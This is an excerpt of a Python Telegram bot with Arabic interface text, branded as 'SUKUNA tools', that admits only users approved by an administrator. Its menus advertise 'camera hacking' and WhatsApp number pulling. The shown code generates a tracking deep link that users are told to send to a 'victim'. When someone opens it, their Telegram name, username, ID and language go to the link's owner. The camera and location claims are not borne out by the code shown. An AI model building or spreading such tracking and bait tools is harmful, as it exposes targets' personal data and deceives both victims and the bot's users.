...
ADMIN_ID = 6709215417  # !!! ضع الأيدي الخاص بك هنا لتتحكم في قبول الأشخاص !!!
...
def main_markup():
    ...
    markup.add(types.KeyboardButton("سحب ارقام وتساب"), types.KeyboardButton("📸 اختراق الكاميرا"))
...
def start(message):
    ...
    if len(message.text.split()) > 1:
        ...
        if start_param.startswith("track_"):
            owner_admin_id = start_param.split("_")[1]
            victim_info = (f"🔔 تم دخول شخص عبر رابطك!\n\n"
                           f"الاسم: {message.from_user.first_name}\n"
                           f"اليوزر: @{message.from_user.username}\n"
                           f"الايدي: `{user_id}`\n"
                           f"اللغة: {message.from_user.language_code}")
            try:
                bot.send_message(owner_admin_id, victim_info, parse_mode="Markdown")
            except:
                pass
    ...
    if user_id in white_list or user_id == ADMIN_ID:
        bot.send_message(message.chat.id, "مرحباً بك في أدوات SUKUNA، اختر الأداة المطلوبة:", reply_markup=main_markup())
    else:
        # إرسال طلب للآدمن
        bot.send_message(message.chat.id, "⏳ عذراً، هذا البوت خاص. تم إرسال طلبك للمطور، انتظر الموافقة للدخول.")
        
        # --- التعديل هنا ليكون مثل الصورة (أزرار بجانب بعضها) ---
        markup = types.InlineKeyboardMarkup()
        btn_accept = types.InlineKeyboardButton("قبول ✅", callback_data=f"accept_{user_id}")
        btn_reject = types.InlineKeyboardButton("رفض ❌", callback_data=f"reject_{user_id}")
        markup.row(btn_reject, btn_accept) # وضع الزرين في صف واحد
...
def callback_query(call):
    if call.data.startswith("accept_"):
        ...
        bot.edit_message_text(f"✅ تم القبول للعضو `{target_id}`.", ADMIN_ID, call.message.id)
        bot.send_message(target_id, "🎉 مبروك! وافق المطور على دخولك، أرسل /start الآن.")
        
    elif call.data.startswith("reject_"):
        target_id = int(call.data.split("_")[1])
        bot.answer_callback_query(call.id, "تم الرفض")
        bot.edit_message_text(f"❌ تم الرفض للعضو `{target_id}`.", ADMIN_ID, call.message.id)
        bot.send_message(target_id, "🚫 نعتذر، تم رفض طلب دخولك.")
...
def handle_text(message):
    ...
    if user_id not in white_list and user_id != ADMIN_ID:
        bot.reply_to(message, "❌ انتظر موافقة المطور أولاً.")
        return
    ...
    if text == "ادوات اضافية":
        ...
        track_url = f"https://t.me/{bot_username}?start=track_{user_id}"
        msg = (f"🌐 *أداة سحب المعلومات (IP & ID)*\n\n"
               f"أرسل هذا الرابط لصديقك، وبمجرد دخوله سيصلك الـ ID ومعلوماته فوراً:\n\n"
               f"`{track_url}`")
        bot.reply_to(message, msg, parse_mode="Markdown")

    elif text == "📸 اختراق الكاميرا":
        bot_username = bot.get_me().username
        track_url = f"https://t.me/{bot_username}?start=track_{user_id}"
        msg = (f"📸 *أداة تلغيم الموقع والكاميرا*\n\n"
               f"أرسل هذا الرابط للضحية، بمجرد فتحه سيتم ربط موقعه بحسابك وسحب بيانات الوصول:\n\n"
               f"`{track_url}`")
        bot.reply_to(message, msg, parse_mode="Markdown")
